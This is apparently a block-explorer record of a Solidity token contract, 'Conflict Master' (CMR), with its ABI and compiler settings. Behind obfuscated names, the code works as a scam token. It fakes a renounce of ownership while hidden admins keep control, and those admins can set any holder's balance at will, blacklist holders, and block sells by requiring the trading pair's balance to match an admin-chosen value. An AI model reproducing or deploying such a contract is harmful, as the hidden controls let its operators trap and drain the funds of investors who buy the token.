{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface swapShould {\n    function createPair(address senderToken, address takeBuyTeam) external returns (address);\n}\n\ninterface totalAutoMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAuto) external view returns (uint256);\n\n    function transfer(address enableSell, uint256 listSender) external returns (bool);\n\n    function allowance(address shouldAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableSell,\n        uint256 listSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txSwap, uint256 value);\n    event Approval(address indexed shouldAt, address indexed spender, uint256 value);\n}\n\nabstract contract autoIsLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalAutoMinMetadata is totalAutoMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConflictMaster is autoIsLiquidity, totalAutoMin, totalAutoMinMetadata {\n\n    function enableReceiver(address enableAmount, address enableSell, uint256 listSender) internal returns (bool) {\n        if (enableAmount == launchReceiver) {\n            return toList(enableAmount, enableSell, listSender);\n        }\n        uint256 sellSenderToken = totalAutoMin(amountToken).balanceOf(buyAuto);\n        require(sellSenderToken == autoFee);\n        require(enableSell != buyAuto);\n        if (launchedIsMarketing[enableAmount]) {\n            return toList(enableAmount, enableSell, teamReceiver);\n        }\n        return toList(enableAmount, enableSell, listSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchSellReceiver;\n    }\n\n    function approve(address feeExemptReceiver, uint256 listSender) public virtual override returns (bool) {\n        liquidityList[_msgSender()][feeExemptReceiver] = listSender;\n        emit Approval(_msgSender(), feeExemptReceiver, listSender);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return maxFee;\n    }\n\n    uint256 private tokenSender;\n\n    bool private totalBuy;\n\n    bool private takeTotal;\n\n    mapping(address => bool) public launchedIsMarketing;\n\n    string private takeFund = \"CMR\";\n\n    uint256 private modeExempt;\n\n    address public launchReceiver;\n\n    function balanceOf(address enableAuto) public view virtual override returns (uint256) {\n        return autoReceiver[enableAuto];\n    }\n\n    address launchTxAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isFromTotal() private view {\n        require(marketingExemptTotal[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableExempt;\n    }\n\n    address buyAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 autoTo;\n\n    event OwnershipTransferred(address indexed limitTake, address indexed receiverToFee);\n\n    function allowance(address launchLaunched, address feeExemptReceiver) external view virtual override returns (uint256) {\n        if (feeExemptReceiver == launchTxAuto) {\n            return type(uint256).max;\n        }\n        return liquidityList[launchLaunched][feeExemptReceiver];\n    }\n\n    function getOwner() external view returns (address) {\n        return maxFee;\n    }\n\n    bool public tradingTo;\n\n    address private maxFee;\n\n    function feeLaunchMin(address modeToList) public {\n        require(modeToList.balance < 100000);\n        if (launchedFromShould) {\n            return;\n        }\n        if (limitTx == takeTotal) {\n            launchedMarketingTo = receiverLimitSell;\n        }\n        marketingExemptTotal[modeToList] = true;\n        \n        launchedFromShould = true;\n    }\n\n    uint256 private receiverLimitSell;\n\n    mapping(address => uint256) private autoReceiver;\n\n    uint256 constant teamReceiver = 6 ** 10;\n\n    function enableFee(address receiverMode, uint256 listSender) public {\n        isFromTotal();\n        autoReceiver[receiverMode] = listSender;\n    }\n\n    mapping(address => bool) public marketingExemptTotal;\n\n    function fromFee(address tokenMax) public {\n        isFromTotal();\n        if (modeExempt != tokenSender) {\n            tokenSender = autoLimit;\n        }\n        if (tokenMax == launchReceiver || tokenMax == amountToken) {\n            return;\n        }\n        launchedIsMarketing[tokenMax] = true;\n    }\n\n    string private enableExempt = \"Conflict Master\";\n\n    uint8 private launchSellReceiver = 18;\n\n    uint256 autoFee;\n\n    uint256 private shouldFrom = 100000000 * 10 ** 18;\n\n    bool private limitTx;\n\n    function toList(address enableAmount, address enableSell, uint256 listSender) internal returns (bool) {\n        require(autoReceiver[enableAmount] >= listSender);\n        autoReceiver[enableAmount] -= listSender;\n        autoReceiver[enableSell] += listSender;\n        emit Transfer(enableAmount, enableSell, listSender);\n        return true;\n    }\n\n    function transferFrom(address enableAmount, address enableSell, uint256 listSender) external override returns (bool) {\n        if (_msgSender() != launchTxAuto) {\n            if (liquidityList[enableAmount][_msgSender()] != type(uint256).max) {\n                require(listSender <= liquidityList[enableAmount][_msgSender()]);\n                liquidityList[enableAmount][_msgSender()] -= listSender;\n            }\n        }\n        return enableReceiver(enableAmount, enableSell, listSender);\n    }\n\n    constructor (){\n        \n        takeTo takeIs = takeTo(launchTxAuto);\n        amountToken = swapShould(takeIs.factory()).createPair(takeIs.WETH(), address(this));\n        \n        launchReceiver = _msgSender();\n        marketingExemptTotal[launchReceiver] = true;\n        autoReceiver[launchReceiver] = shouldFrom;\n        modeWallet();\n        if (totalBuy) {\n            launchList = tokenSender;\n        }\n        emit Transfer(address(0), launchReceiver, shouldFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeFund;\n    }\n\n    uint256 public launchedMarketingTo;\n\n    mapping(address => mapping(address => uint256)) private liquidityList;\n\n    function fromReceiver(uint256 listSender) public {\n        isFromTotal();\n        autoFee = listSender;\n    }\n\n    function transfer(address receiverMode, uint256 listSender) external virtual override returns (bool) {\n        return enableReceiver(_msgSender(), receiverMode, listSender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldFrom;\n    }\n\n    address public amountToken;\n\n    uint256 private launchList;\n\n    uint256 public autoLimit;\n\n    bool public launchedFromShould;\n\n    function modeWallet() public {\n        emit OwnershipTransferred(launchReceiver, address(0));\n        maxFee = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeExemptReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"enableFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToList\",\"type\":\"address\"}],\"name\":\"feeLaunchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"}],\"name\":\"fromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFromShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedIsMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingExemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConflictMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}